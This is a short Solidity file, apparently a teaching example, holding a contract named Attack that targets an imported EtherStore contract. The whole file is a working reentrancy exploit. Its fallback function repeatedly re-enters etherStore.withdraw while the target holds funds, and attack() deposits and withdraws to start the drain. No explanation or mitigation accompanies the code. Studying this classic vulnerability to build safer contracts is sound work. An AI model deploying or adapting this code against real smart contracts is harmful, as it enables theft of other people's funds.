// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  fallback() external payable {
      if (address(etherStore).balance >= 1e9 wei) {
          etherStore.withdraw(1e9 wei);
      }
  }

  function attack() external payable {
      require(msg.value >= 1e9 wei);
      etherStore.deposit{value: 1e9 wei}();
      etherStore.withdraw(1e9 wei);
  }

  function getBalance() public view returns (uint) {
      return address(this).balance;
  }
}